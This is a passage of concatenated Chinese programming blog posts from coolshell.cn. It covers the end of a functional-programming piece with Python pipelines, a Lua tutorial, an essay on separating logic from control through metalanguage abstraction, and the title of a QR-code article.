pipeline = convert_to_string(multiply_by_three(even_filter(nums)))

**for** num **in** pipeline:

​    print num

\# 输出：

\# The Number: 6

\# The Number: 12

\# The Number: 18

\# The Number: 24

\# The Number: 30

我们动用了Python的关键字 yield，这个关键字主要是返回一个Generator，yield 是一个类似 return 的关键字，只是这个函数返回的是个Generator-生成器。所谓生成器的意思是，yield返回的是一个可迭代的对象，并没有真正的执行函数。也就是说，只有其返回的迭代对象被真正迭代时，yield函数才会正真的运行，运行到yield语句时就会停住，然后等下一次的迭代。（这个是个比较诡异的关键字）这就是lazy evluation。

好了，根据前面的原则——“**使用Map & Reduce，不要使用循环**”，那我们用比较纯朴的Map & Reduce吧。

**def** even_filter(nums):

​    **return** filter(**lambda** x: x%2==0, nums)

**def** multiply_by_three(nums):

​    **return** map(**lambda** x: x*3, nums)

**def** convert_to_string(nums):

​    **return** map(**lambda** x: 'The Number: %s' % x,  nums)

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

pipeline = convert_to_string(

​               multiply_by_three(

​                   even_filter(nums)

​               )

​            )

**for** num **in** pipeline:

​    print num

但是他们的代码需要嵌套使用函数，这个有点不爽，如果我们能像下面这个样子就好了（第二种方式）。

pipeline_func(nums, [even_filter,

​                     multiply_by_three,

​                     convert_to_string])

那么，pipeline_func 实现如下：

**def** pipeline_func(data, fns):

​    **return** reduce(**lambda** a, x: x(a),

​                  fns,

​                  data)

好了，在读过这么多的程序后，你可以回头看一下这篇文章的开头对函数式编程的描述，可能你就更有感觉了。

最后，**我希望这篇浅显易懂的文章能让你感受到函数式编程的思想，就像OO编程，泛型编程，过程式编程一样，我们不用太纠结是不是我们的程序就是OO，就是functional的，我们重要的品味其中的味道**。

#### 参考

- Wikipedia: [Functional Programming](https://en.wikipedia.org/wiki/Functional_programming)
- [truly understanding the difference between procedural and functional](http://stackoverflow.com/questions/5226055/truly-understanding-the-difference-between-procedural-and-functional)
- [A practical introduction to functional programming](http://maryrosecook.com/post/a-practical-introduction-to-functional-programming)
- [What is the difference between procedural programming and functional programming?](http://stackoverflow.com/q/23277/211232)
- [Can someone give me examples of functional programming vs imperative/procedural programming?](http://stackoverflow.com/q/3249863/211232)
- [OOP vs Functional Programming vs Procedural](http://stackoverflow.com/q/552336/211232)
- Python – [Functional Programming HOWTO](https://docs.python.org/2/howto/functional.html#)

**补充**：评论中[redraiment](http://weibo.com/redraiment)的[这个评论](https://coolshell.cn/articles/10822.html#comment-1111518)大家也可以读一读。

感谢谢网友S142857 提供的shell风格的python pipeline：

**class** Pipe(object):

​    **def** __init__(self, func):

​        self.func = func

​    **def** __ror__(self, other):

​        **def** generator():

​            **for** obj **in** other:

​                **if** obj **is** not **None**:

​                    **yield** self.func(obj)

​        **return** generator()

@Pipe

**def** even_filter(num):

​    **return** num **if** num % 2 == 0 **else** **None**

@Pipe

**def** multiply_by_three(num):

​    **return** num*3

@Pipe

**def** convert_to_string(num):

​    **return** 'The Number: %s' % num

@Pipe

**def** echo(item):

​    print item

​    **return** item

**def** force(sqs):

​    **for** item **in** sqs: **pass**

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

force(nums | even_filter | multiply_by_three | convert_to_string | echo)

（全文完）

# LUA简明教程

#####  [2013年12月03日 ](https://coolshell.cn/articles/10739.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [125 条评论](https://coolshell.cn/articles/10739.html#comments) 269,247 人阅读

![The Programming Language Lua](http://www.lua.org/images/lua.gif)这几天系统地学习了一下[Lua这个脚本语言](http://www.lua.org/)，Lua脚本是一个很轻量级的脚本，也是号称性能最高的脚本，用在很多需要性能的地方，比如：游戏脚本，nginx，wireshark的脚本，当你把他的源码下下来编译后，你会发现解释器居然不到200k，这是多么地变态啊（/bin/sh都要1M，MacOS平台），而且能和C语言非常好的互动。我很好奇得浏览了一下Lua解释器的源码，这可能是我看过最干净的C的源码了。

我不想写一篇大而全的语言手册，一方面是因为已经有了（见本文后面的链接），重要的原因是，因为大篇幅的文章会挫败人的学习热情，我始终觉得好的文章读起来就像拉大便一样，能一口气很流畅地搞完，才会让人爽（这也是我为什么不想写书的原因）。所以，这必然又是一篇“入厕文章”，还是那句话，我希望本文能够让大家利用上下班，上厕所大便的时间学习一个技术。呵呵。

相信你现在已经在厕所里脱掉裤子露出屁股已经准备好大便了，那就让我们畅快地排泄吧……

目录



[运行](https://coolshell.cn/articles/10739.html#运行)[语法](https://coolshell.cn/articles/10739.html#语法)[注释](https://coolshell.cn/articles/10739.html#注释)[变量](https://coolshell.cn/articles/10739.html#变量)[控制语句](https://coolshell.cn/articles/10739.html#控制语句)[while循环](https://coolshell.cn/articles/10739.html#while循环)[if-else分支](https://coolshell.cn/articles/10739.html#if-else分支)[for 循环](https://coolshell.cn/articles/10739.html#for_循环)[until循环](https://coolshell.cn/articles/10739.html#until循环)[函数](https://coolshell.cn/articles/10739.html#函数)[递归](https://coolshell.cn/articles/10739.html#递归)[闭包](https://coolshell.cn/articles/10739.html#闭包)[函数的返回值](https://coolshell.cn/articles/10739.html#函数的返回值)[局部函数](https://coolshell.cn/articles/10739.html#局部函数)[Table](https://coolshell.cn/articles/10739.html#Table)[MetaTable 和 MetaMethod](https://coolshell.cn/articles/10739.html#MetaTable_和_MetaMethod)[“面向对象”](https://coolshell.cn/articles/10739.html#“面向对象”)[模块](https://coolshell.cn/articles/10739.html#模块)[参考](https://coolshell.cn/articles/10739.html#参考)

#### 运行

首先，我们需要知道，Lua是类C的，所以，他是大小写字符敏感的。

下面是Lua的Hello World。注意：Lua脚本的语句的分号是可选的，这个和[GO语言很类似](https://coolshell.cn/articles/8460.html)。

```
print("Hello World")
```

你可以像python一样，在命令行上运行lua命令后进入lua的shell中执行语句。

```
chenhao-air:lua chenhao$ lua
Lua 5.2.2  Copyright (C) 1994-2013 Lua.org, PUC-Rio
> print("Hello, World")
Hello, World
> 
```



也可以把脚本存成一个文件，用如下命令行来运行。

```
>lua file.lua
```

或是像shell一样运行：

```
chenhao-air:lua chenhao$ cat hello.lua
#!/usr/local/bin/lua
print("Hello, World")
chenhao-air:lua chenhao$ chmod +x hello.lua
chenhao-air:test chenhao$ ./hello.lua
Hello, World
```

#### 语法

##### 注释

```
-- 两个减号是行注释
```

 

```
--[[
 这是块注释
 这是块注释
 --]]
```

##### 变量

Lua的数字只有double型，64bits，你不必担心Lua处理浮点数会慢（除非大于100,000,000,000,000），或是会有精度问题。

你可以以如下的方式表示数字，0x开头的16进制和C是很像的。

```
num = 1024
num = 3.0
num = 3.1416
num = 314.16e-2
num = 0.31416E1
num = 0xff
num = 0x56
```

字符串你可以用单引号，也可以用双引号，还支持C类型的转义，比如： ‘\a’ （响铃）， ‘\b’ （退格）， ‘\f’ （表单）， ‘\n’ （换行）， ‘\r’ （回车）， ‘\t’ （横向制表）， ‘\v’ （纵向制表）， ‘\\’ （反斜杠）， ‘\”‘ （双引号）， 以及 ‘\” （单引号)

下面的四种方式定义了完全相同的字符串（其中的两个中括号可以用于定义有换行的字符串）

```
a = 'alo\n123"'
a = "alo\n123\""
a = '\97lo\10\04923"'
a = [[alo
123"]]
```

C语言中的NULL在Lua中是nil，比如你访问一个没有声明过的变量，就是nil，比如下面的v的值就是nil

```
v = UndefinedVariable
```

布尔类型只有nil和false是 false，数字0啊，‘’空字符串（’\0’）都是true！

另外，需要注意的是：lua中的变量如果没有特殊说明，全是全局变量，那怕是语句块或是函数里。变量前加local关键字的是局部变量。

```
theGlobalVar = 50
local theLocalVar = "local variable"
```

#### 控制语句

不多说了，直接看代码吧（注意：Lua没有++或是+=这样的操作）

##### while循环

```
sum = 0
num = 1
while num <= 100 do
    sum = sum + num
    num = num + 1
end
print("sum =",sum)
```

##### if-else分支

```
if age == 40 and sex =="Male" then
    print("男人四十一枝花")
elseif age > 60 and sex ~="Female" then
    print("old man without country!")
elseif age < 20 then
    io.write("too young, too naive!\n")
else
    local age = io.read()
    print("Your age is "..age)
end
```

上面的语句不但展示了if-else语句，也展示了
1）“～=”是不等于，而不是!=
2）io库的分别从stdin和stdout读写的read和write函数
3）字符串的拼接操作符“..”

另外，条件表达式中的与或非为分是：and, or, not关键字。

##### for 循环

```
sum = 0
for i = 1, 100 do
    sum = sum + i
end
```

 

```
sum = 0
for i = 1, 100, 2 do
    sum = sum + i
end
```

 

```
sum = 0
for i = 100, 1, -2 do
    sum = sum + i
end
```

##### until循环

```
sum = 2
repeat
   sum = sum ^ 2 --幂操作
   print(sum)
until sum >1000
```

#### 函数

Lua的函数和Javascript的很像

##### 递归

```
function fib(n)
  if n < 2 then return 1 end
  return fib(n - 2) + fib(n - 1)
end
```

##### 闭包

同样，Javascript附体！

```
function newCounter()
    local i = 0
    return function()     -- anonymous function
       i = i + 1
        return i
    end
end

c1 = newCounter()
print(c1())  --> 1
print(c1())  --> 2
```

 

```
function myPower(x)
    return function(y) return y^x end
end

power2 = myPower(2)
power3 = myPower(3)

print(power2(4)) --4的2次方
print(power3(5)) --5的3次方
```

##### 函数的返回值

和[Go语言一样](https://coolshell.cn/articles/8460.html)，可以一条语句上赋多个值，如：

```
name, age, bGay = "haoel", 37, false, "haoel@hotmail.com"
```

上面的代码中，因为只有3个变量，所以第四个值被丢弃。

函数也可以返回多个值：

```
function getUserInfo(id)
    print(id)
    return "haoel", 37, "haoel@hotmail.com", "https://coolshell.cn"
end

name, age, email, website, bGay = getUserInfo()
```

注意：上面的示例中，因为没有传id，所以函数中的id输出为nil，因为没有返回bGay，所以bGay也是nil。

##### 局部函数

函数前面加上local就是局部函数，其实，Lua中的函数和Javascript中的一个德行。

比如：下面的两个函数是一样的：

```
function foo(x) return x^2 end
foo = function(x) return x^2 end
```

#### Table

所谓Table其实就是一个Key Value的数据结构，它很像Javascript中的Object，或是PHP中的数组，在别的语言里叫Dict或Map，Table长成这个样子：

```
haoel = {name="ChenHao", age=37, handsome=True}
```

下面是table的CRUD操作：

```
haoel.website="https://coolshell.cn/"
local age = haoel.age
haoel.handsome = false
haoel.name=nil
```

上面看上去像C/C++中的结构体，但是name,age, handsome, website都是key。你还可以像下面这样写义Table：

```
t = {[20]=100, ['name']="ChenHao", [3.14]="PI"}
```

这样就更像Key Value了。于是你可以这样访问：t[20]，t[“name”], t[3.14]。

我们再来看看数组：

```
arr = {10,20,30,40,50}
```

这样看上去就像数组了。但其实其等价于：

```
arr = {[1]=10, [2]=20, [3]=30, [4]=40, [5]=50}
```

所以，你也可以定义成不同的类型的数组，比如：

```
arr = {"string", 100, "haoel", function() print("coolshell.cn") end}
```

注：其中的函数可以这样调用：arr[4]()。

我们可以看到Lua的下标不是从0开始的，是从1开始的。

```
for i=1, #arr do
    print(arr[i])
end
```

注：上面的程序中：#arr的意思就是arr的长度。

注：前面说过，Lua中的变量，如果没有local关键字，全都是全局变量，Lua也是用Table来管理全局变量的，Lua把这些全局变量放在了一个叫“_G”的Table里。

我们可以用如下的方式来访问一个全局变量（假设我们这个全局变量名叫globalVar）：

```
_G.globalVar
_G["globalVar"]
```

我们可以通过下面的方式来遍历一个Table。

```
for k, v in pairs(t) do
    print(k, v)
end
```

#### MetaTable 和 MetaMethod

MetaTable和MetaMethod是Lua中的重要的语法，MetaTable主要是用来做一些类似于C++重载操作符式的功能。

比如，我们有两个分数：

```
fraction_a = {numerator=2, denominator=3}
fraction_b = {numerator=4, denominator=7}
```

我们想实现分数间的相加：2/3 + 4/7，我们如果要执行： fraction_a + fraction_b，会报错的。

所以，我们可以动用MetaTable，如下所示：

```
fraction_op={}
function fraction_op.__add(f1, f2)
    ret = {}
    ret.numerator = f1.numerator * f2.denominator + f2.numerator * f1.denominator
    ret.denominator = f1.denominator * f2.denominator
    return ret
end
```

为之前定义的两个table设置MetaTable：（其中的setmetatble是库函数）

```
setmetatable(fraction_a, fraction_op)
setmetatable(fraction_b, fraction_op)
```

于是你就可以这样干了：（调用的是fraction_op.__add()函数）

```
fraction_s = fraction_a + fraction_b
```

至于__add这是MetaMethod，这是Lua内建约定的，其它的还有如下的MetaMethod：

```
__add(a, b)                     对应表达式 a + b
__sub(a, b)                     对应表达式 a - b
__mul(a, b)                     对应表达式 a * b
__div(a, b)                     对应表达式 a / b
__mod(a, b)                     对应表达式 a % b
__pow(a, b)                     对应表达式 a ^ b
__unm(a)                        对应表达式 -a
__concat(a, b)                  对应表达式 a .. b
__len(a)                        对应表达式 #a
__eq(a, b)                      对应表达式 a == b
__lt(a, b)                      对应表达式 a < b
__le(a, b)                      对应表达式 a <= b
__index(a, b)                   对应表达式 a.b
__newindex(a, b, c)             对应表达式 a.b = c
__call(a, ...)                  对应表达式 a(...)
```

#### “面向对象”

上面我们看到有__index这个重载，这个东西主要是重载了find key的操作。这操作可以让Lua变得有点面向对象的感觉，让其有点像Javascript的prototype。（关于Javascrip的面向对象，你可以参看我之前写的[Javascript的面向对象](https://coolshell.cn/articles/6441.html)）

所谓__index，说得明确一点，如果我们有两个对象a和b，我们想让b作为a的prototype只需要：

```
setmetatable(a, {__index = b})
```

例如下面的示例：你可以用一个Window_Prototype的模板加上__index的MetaMethod来创建另一个实例：

```
Window_Prototype = {x=0, y=0, width=100, height=100}
MyWin = {title="Hello"}
setmetatable(MyWin, {__index = Window_Prototype})
```

于是：MyWin中就可以访问x, y, width, height的东东了。（注：当表要索引一个值时如table[key], Lua会首先在table本身中查找key的值, 如果没有并且这个table存在一个带有__index属性的Metatable, 则Lua会按照__index所定义的函数逻辑查找）

有了以上的基础，我们可以来说说所谓的Lua的面向对象。

```
Person={}

function Person:new(p)
    local obj = p
    if (obj == nil) then
        obj = {name="ChenHao", age=37, handsome=true}
    end
    self.__index = self
    return setmetatable(obj, self)
end

function Person:toString()
    return self.name .." : ".. self.age .." : ".. (self.handsome and "handsome" or "ugly")
end
```

上面我们可以看到有一个new方法和一个toString的方法。其中：

1）self 就是 Person，Person:new(p)，相当于Person.new(self, p)
2）new方法的self.__index = self 的意图是怕self被扩展后改写，所以，让其保持原样
3）setmetatable这个函数返回的是第一个参数的值。

于是：我们可以这样调用：

```
me = Person:new()
print(me:toString())

kf = Person:new{name="King's fucking", age=70, handsome=false}
print(kf:toString())
```

继承如下，我就不多说了，Lua和Javascript很相似，都是在Prototype的实例上改过来改过去的。

```
Student = Person:new()

function Student:new()
    newObj = {year = 2013}
    self.__index = self
    return setmetatable(newObj, self)
end

function Student:toString()
    return "Student : ".. self.year.." : " .. self.name
end
```

#### 模块

我们可以直接使用require(“model_name”)来载入别的lua文件，文件的后缀是.lua。载入的时候就直接执行那个文件了。比如：

我们有一个hello.lua的文件：

```
print("Hello, World!")
```

如果我们：require(“hello”)，那么就直接输出Hello, World！了。

注意：
1）require函数，载入同样的lua文件时，只有第一次的时候会去执行，后面的相同的都不执行了。
2）如果你要让每一次文件都会执行的话，你可以使用dofile(“hello”)函数
3）如果你要玩载入后不执行，等你需要的时候执行时，你可以使用 loadfile()函数，如下所示：

```
local hello = loadfile("hello")
... ...
... ...
hello()
```

loadfile(“hello”)后，文件并不执行，我们把文件赋给一个变量hello，当hello()时，才真的执行。（我们多希望JavaScript也有这样的功能（参看《[Javascript 装载和执行](https://coolshell.cn/articles/9749.html)》））

当然，更为标准的玩法如下所示。

假设我们有一个文件叫mymod.lua，内容如下：

```
local HaosModel = {}

local function getname()
    return "Hao Chen"
end

function HaosModel.Greeting()
    print("Hello, My name is "..getname())
end

return HaosModel
```

于是我们可以这样使用：

```
local hao_model = require("mymod")
hao_model.Greeting()
```

其实，require干的事就如下：（所以你知道为什么我们的模块文件要写成那样了）

```
local hao_model = (function ()
  --mymod.lua文件的内容--
end)()
```

#### 参考

我估计你差不多到擦屁股的时间了，所以，如果你还比较喜欢Lua的话，下面是几个在线文章你可以继续学习之：

- [manual.luaer.cn](http://manual.luaer.cn/) lua在线手册
- [book.luaer.cn](http://book.luaer.cn/) lua在线lua学习教程
- [lua参考手册](http://www.codingnow.com/2000/download/lua_manual.html)Lua参考手册的中文翻译（云风翻译版本）

关于Lua的标库，你可以看看官方文档：[string](http://lua-users.org/wiki/StringLibraryTutorial)， [table](http://lua-users.org/wiki/TableLibraryTutorial)， [math](http://lua-users.org/wiki/MathLibraryTutorial)， [io](http://lua-users.org/wiki/IoLibraryTutorial)， [os](http://lua-users.org/wiki/OsLibraryTutorial)。

（全文完）

# 程序的本质复杂性和元语言抽象

#####  [2013年10月31日 ](https://coolshell.cn/articles/10652.html) [Todd](https://coolshell.cn/articles/author/todd) 评论 [97 条评论](https://coolshell.cn/articles/10652.html#comments) 47,500 人阅读

**（感谢 [@文艺复兴记](http://weibo.com/weidagang)（todd） 投递此文）**

目录



[组件复用技术的局限性](https://coolshell.cn/articles/10652.html#组件复用技术的局限性)[程序的本质复杂性](https://coolshell.cn/articles/10652.html#程序的本质复杂性)[元语言抽象](https://coolshell.cn/articles/10652.html#元语言抽象)[总结](https://coolshell.cn/articles/10652.html#总结)

#### 组件复用技术的局限性

常听到有人讲“我写代码很讲究，一直严格遵循[DRY原则](https://en.wikipedia.org/wiki/Don't_repeat_yourself)，把重复使用的功能都封装成可复用的组件，使得代码简短优雅，同时也易于理解和维护”。显然，DRY原则和组件复用技术是最常见的改善代码质量的方法，不过，在我看来以这类方法为指导，能帮助我们写出“不错的程序”，但还不足以帮助我们写出简短、优雅、易理解、易维护的“好程序”。对于熟悉Martin Fowler《重构》和GoF《设计模式》的程序员，我常常提出这样一个问题帮助他们进一步加深对程序的理解：

> 如果目标是代码“简短、优雅、易理解、易维护”，组件复用技术是最好的方法吗？这种方法有没有根本性的局限？

虽然基于函数、类等形式的组件复用技术从一定程度上消除了冗余，提升了代码的抽象层次，但是这种技术却有着本质的局限性，其根源在于 **每种组件形式都代表了特定的抽象维度，组件复用只能在其维度上进行抽象层次的提升**。比如，我们可以把常用的HashMap等功能封装为类库，但是不管怎么封装复用类永远是类，封装虽然提升了代码的抽象层次，但是它永远不会变成Lambda，而实际问题所代表的抽象维度往往与之并不匹配。

以常见的二进制消息的解析为例，组件复用技术所能做到的只是把读取字节，检查约束，计算CRC等功能封装成函数，这是远远不够的。比如，下面的表格定义了二进制消息X的格式：



```
Message X:
--------------------------------------------------------
| ID |  Name           | Type    | Size | Constraints  |
--------------------------------------------------------
| 1  | message type    | int     | 1    | = 0x01       |
--------------------------------------------------------
| 2  | payload size    | int     | 2    | > 0          |
--------------------------------------------------------
| 3  | payload         | bytes   | <2>  |              |
--------------------------------------------------------
| 4  | CRC             | int     | 4    |              |
--------------------------------------------------------
```

它的解析函数大概是这个样子：

```
bool parse_message_x(char* data, int32 size, MessageX& x) {
    char *ptr = data;
    if (ptr + sizeof(int8) <= data + size) {
        x.message_type = read_int8(ptr);
        if (0x01 != x.message_type) return false;
        ptr += sizeof(int8);
    } else {
        return false;
    }
    if (ptr + sizeof(int16) <= data + size) {
        x.payload_size = read_int16(ptr);
        ptr += sizeof(int16);
    } else {
        return false;
    }
    if (ptr + x.payload_size <= data + size) {
        x.payload = new int8[x.payload_size];
        read(ptr, x.payload, x.payload_size);
        ptr += x.payload_size;
    } else {
        return false;
    }
    if (ptr + sizeof(int32) <= data + size) {
        x.crc = read_int32(ptr);
        ptr += sizeof(int32);
    } else {
        delete x.payload;
        return false;
    }
    if (crc(data, sizeof(int8) + sizeof(int16) + x.payload_size) != x.crc) {
        delete x.payload;
        return false;
    }
    return true;
}
```

很明显，虽然消息X的定义非常简单，但是它的解析函数却显得很繁琐，需要小心翼翼地处理很多细节。在处理其他消息Y时，虽然虽然Y和X很相似，但是却不得不再次在解析过程中处理这些细节，就是组件复用方法的局限性，它只能帮我们按照函数或者类的语义把功能封装成可复用的组件，但是消息的结构特征既不是函数也不是类，这就是抽象维度的失配。

#### 程序的本质复杂性

上面分析了组件复用技术有着根本性的局限性，现在我们要进一步思考：

> 如果目标还是代码“简短、优雅、易理解、易维护”，那么代码优化是否有一个理论极限？这个极限是由什么决定的？普通代码比起最优代码多出来的“冗余部分”到底干了些什么事情？

回答这个问题要从程序的本质说起。Pascal语言之父Niklaus Wirth在70年代提出：Program = Data Structure + Algorithm，随后逻辑学家和计算机科学家R Kowalski进一步提出：Algorithm = Logic + Control。谁更深刻更有启发性？当然是后者！而且我认为数据结构和算法都属于控制策略，综合二位的观点，加上我自己的理解，程序的本质是：Program = Logic + Control。换句话说，程序包含了逻辑和控制两个维度。

逻辑就是问题的定义，比如，对于排序问题来讲，逻辑就是“什么叫做有序，什么叫大于，什么叫小于，什么叫相等”？控制就是如何合理地安排时间和空间资源去实现逻辑。逻辑是程序的灵魂，它定义了程序的本质；控制是为逻辑服务的，是非本质的，可以变化的，如同排序有几十种不同的方法，时间空间效率各不相同，可以根据需要采用不同的实现。

程序的复杂性包含了本质复杂性和非本质复杂性两个方面。套用这里的术语， **程序的本质复杂性就是逻辑，非本质复杂性就是控制**。逻辑决定了代码复杂性的下限，也就是说不管怎么做代码优化，Office程序永远比Notepad程序复杂，这是因为前者的逻辑就更为复杂。如果要代码简洁优雅，任何语言和技术所能做的只是尽量接近这个本质复杂性，而不可能超越这个理论下限。

理解”程序的本质复杂性是由逻辑决定的”从理论上为我们指明了代码优化的方向：让逻辑和控制这两个维度保持正交关系。来看Java的Collections.sort方法的例子：

```
interface Comparator<T> {
    int compare(T o1, T o2);
}
public static <T> void sort(List<T> list, Comparator<? super T> comparator)
```

使用者只关心逻辑部份，即提供一个Comparator对象表明序在类型T上的定义；控制的部分完全交给方法实现者，可以有多种不同的实现，这就是逻辑和控制解耦。同时，我们也可以断定，这个设计已经达到了代码优化的理论极限，不会有本质上比它更简洁的设计（忽略相同语义的语法差异），为什么？因为逻辑决定了它的本质复杂度，Comparator和Collections.sort的定义完全是逻辑的体现，不包含任何非本质的控制部分。

另外需要强调的是，上面讲的“控制是非本质复杂性”并不是说控制不重要，控制往往直接决定了程序的性能，当我们因为性能等原因必须采用某种控制的时候，实际上被固化的控制策略也是一种逻辑。比如，当你的需求是“从进程虚拟地址ptr1拷贝1024个字节到地址ptr2“，那么它就是问题的定义，它就是逻辑，这时，提供进程虚拟地址直接访问语义的底层语言就与之完全匹配，反而是更高层次的语言对这个需求无能为力。

介绍了逻辑和控制的关系，可能很多朋友已经开始意识到了上面二进制文件解析实现的问题在哪里，其实这也是 **绝大多数程序不够简洁优雅的根本原因：逻辑与控制耦合**。上面那个消息定义表格就是不包含控制的纯逻辑，我相信即使不是程序员也能读懂它；而相应的代码把逻辑和控制搅在一起之后就不那么容易读懂了。

熟悉OOP和GoF设计模式的朋友可能会把“逻辑与控制解耦”与经常听说的“接口和实现解耦”联系在一起，他们是不是一回事呢？其实，把这里所说的逻辑和OOP中的接口划等号是似是而非的， 而GoF设计模式最大的问题就在于有意无意地让人们以为“what就是interface, interface就是what”，很多朋友一想到要表达what，要抽象，马上写个接口出来，这就是潜移默化的惯性思维，自己根本意识不到问题在哪里。其实，接口和前面提到的组件复用技术一样，同样受限于特定的抽象维度，它不是表达逻辑的通用方法，比如，我们无法把二进制文件格式特征用接口来表示。

另外，我们熟悉的许多GoF模式以“逻辑与控制解耦”的观点来看，都不是最优的。比如，很多时候Observer模式都是典型的以控制代逻辑，来看一个例子：

> 对于某网页的超链接，要求其颜色随着状态不同而变化，点击之前的颜色是#FF0000，点击后颜色变成#00FF00。

基于Observer模式的实现是这样的：

[javascript]
$(a).css(‘color’, ‘#FF0000’);

$(a).click(function() {
$(this).css(‘color’, ‘#00FF00’);
});
[/javascript]

而基于纯CSS的实现是这样的：

```
a:link {color: #FF0000}
a:visited {color: #00FF00}
```

通过对比，您看出二者的差别了吗？显然，Observer模式包含了非本质的控制，而CSS是只包含逻辑。理论上讲，CSS能做的事情，JavaScript都能通过控制做到，那么为什么浏览器的设计者要引入CSS呢，这对我们有何启发呢？

#### 元语言抽象

好的，我们继续思考下面这个问题：

> 逻辑决定了程序的本质复杂性，但接口不是表达逻辑的通用方式，那么是否存在表达逻辑的通用方式呢？

答案是：有！这就是元(Meta)，包括元语言(Meta Language)和元数据(Meta Data)两个方面。元并不神秘，我们通常所说的配置就是元，元语言就是配置的语法和语义，元数据就是具体的配置，它们之间的关系就是C语言和C程序之间的关系；但是，同时元又非常神奇，因为元既是数据也是代码，在表达逻辑和语义方面具有无与伦比的灵活性。至此，我们终于找到了让代码变得简洁、优雅、易理解、易维护的终极方法，这就是： **通过元语言抽象让逻辑和控制彻底解耦**！

比如，对于二进制消息解析，经典的做法是类似Google的[Protocol Buffers](https://code.google.com/p/protobuf/)，把消息结构特征抽象出来，定义消息描述元语言，再通过元数据描述消息结构。下面是Protocol Buffers元数据的例子，这个元数据是纯逻辑的表达，它的复杂度体现的是消息结构的本质复杂度，而如何序列化和解析这些控制相关的部分被Protocol Buffers编译器隐藏起来了。

```
message Person {
  required int32 id = 1;
  required string name = 2;
  optional string email = 3;
}
```

元语言解决了逻辑表达问题，但是最终要与控制相结合成为具体实现，这就是元语言到目标语言的映射问题。通常有这两种方法：

1) 元编程(Meta Programming)，开发从元语言到目标语言的编译器，将元数据编译为目标程序代码；
2) 元驱动编程(Meta Driven Programming)，直接在目标语言中实现元语言的解释器。

这两种方法各有优势，元编程由于有静态编译阶段，一般产生的目标程序代码性能更好，但是这种方式混合了两个层次的代码，增加了代码配置管理的难度，一般还需要同时配备Build脚本把整个代码生成自动集成到Build过程中，此外，和IDE的集成也是问题；元驱动编程则相反，没有静态编译过程，元语言代码是动态解析的，所以性能上有损失，但是更加灵活，开发和代码配置管理的难度也更小。除非是性能要求非常高的场合，我推荐的是元驱动编程，因为它更轻量，更易于与目标语言结合。

下面是用元驱动编程解决二进制消息解析问题的例子，meta_message_x是元数据，parse_message是解释器：

[javascript]
var meta_message_x = {
id: ‘x’,
fields: [
{ name: ‘message_type’, type: int8, value: 0x01 },
{ name: ‘payload_size’, type: int16 },
{ name: ‘payload’, type: bytes, size: ‘$payload_size’ },
{ name: ‘crc’, type: crc32, source: [‘message_type’, ‘payload_size’, ‘payload’] }
]
}

var message_x = parse_message(meta_message_x, data, size);
[/javascript]

这段代码我用的是JavaScript语法，因为对于支持Literal的类似JSON对象表示的语言中，实现元驱动编程最为简单。如果是Java或C++语言，语法上稍微繁琐一点，不过本质上是一样的，或者引入JSON配置文件，然后解析配置，或者定义MessageConfig类，直接把这个类对象作为配置信息。

二进制文件解析问题是一个经典问题，有Protocol Buffers、Android AIDL等大量的实例，所以很多人能想到引入消息定义元语言，但是如果我们把问题稍微变换，能想到采用这种方法的人就不多了。来看下面这个问题：

> 某网站有新用户注册、用户信息更新，和个性设置等Web表单。出于性能和用户体验的考虑，在用户点击提交表单时，会先进行浏览器端的验证，比如：name字段至少3个字符，password字段至少8个字符，并且和repeat password要一致，email要符合邮箱格式；通过浏览器端验证以后才通过HTTP请求提交到服务器。

普通的实现是这个样子的：

[javascript]
function check_form_x() {
var name = $(‘#name’).val();
if (null == name || name.length <= 3) {
return { status : 1, message: ‘Invalid name’ };
}

var password = $(‘#password’).val();
if (null == password || password.length <= 8) {
return { status : 2, message: ‘Invalid password’ };
}

var repeat_password = $(‘#repeat_password’).val();
if (repeat_password != password.length) {
return { status : 3, message: ‘Password and repeat password mismatch’ };
}

var email = $(‘#email’).val();
if (check_email_format(email)) {
return { status : 4, message: ‘Invalid email’ };
}

…

return { status : 0, message: ‘OK’ };

}
[/javascript]

上面的实现就是按照组建复用的思想封装了一下检测email格式之类的通用函数，这和刚才的二进制消息解析非常相似，没法在不同的表单之间进行大规模复用，很多细节都必须被重复编写。下面是用元语言抽象改进后的做法：

[javascript]
var meta_create_user = {
form_id : ‘create_user’,
fields : [
{ id : ‘name’, type : ‘text’, min_length : 3 },
{ id : ‘password’, type : ‘password’, min_length : 8 },
{ id : ‘repeat-password’, type : ‘password’, min_length : 8 },
{ id : ’email’, type : ’email’ }
]
};

var r = check_form(meta_create_user);
[/javascript]

通过定义表单属性元语言，整个逻辑顿时清晰了，细节的处理只需要在check_form中编写一次，完全实现了“简短、优雅、易理解、以维护”的目标。其实，不仅Web表单验证可以通过元语言描述，整个Web页面从布局到功能全部都可以通过一个元对象描述，完全将逻辑和控制解耦。此外，我编写的用于解析命令行参数的[lineparser.js](https://github.com/weidagang/line-parser-js)库也是基于元语言的，有兴趣的朋友可以参考并对比它和其他命令行解析库的设计差异。

最后，我们再来从代码长度的角度来分析一下元驱动编程和普通方法之间的差异。假设一个功能在系统中出现了n次，对于普通方法来讲，由于逻辑和控制的耦合，它的代码量是n * (L + C)，而元驱动编程只需要实现一次控制，代码长度是C + n * L，其中L表示逻辑相关的代码量，C表示控制相关的代码量。通常情况下L部分都是一些配置，不容易引入bug，复杂的主要是C的部分，普通方法中C被重复了n次，引入bug的可能性大大增加，同时修改一个bug也可能要改n个地方。所以，对于重复出现的功能，元驱动编程大大减少了代码量，减小了引入bug的可能，并且提高了可维护性。

#### 总结

《人月神话》的作者Fred Brooks曾在80年代阐述了它对于软件复杂性的看法，即著名的[No Silver Bullet](https://en.wikipedia.org/wiki/No_Silver_Bullet)。他认为不存在一种技术能使得软件开发在生产力、可靠性、简洁性方面提高一个数量级。我不清楚Brooks这一论断详细的背景，但是就个人的开发经验而言，元驱动编程和普通编程方法相比在生产力、可靠性和简洁性方面的确是数量级的提升,在我看来它就是软件开发的银弹！

# 二维码的生成细节和原理

#####  [2013年10月29日 ](https://coolshell.cn/articles/10590.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [165 条评论](https://coolshell.cn/articles/10590.html#comments) 393,679 人阅读

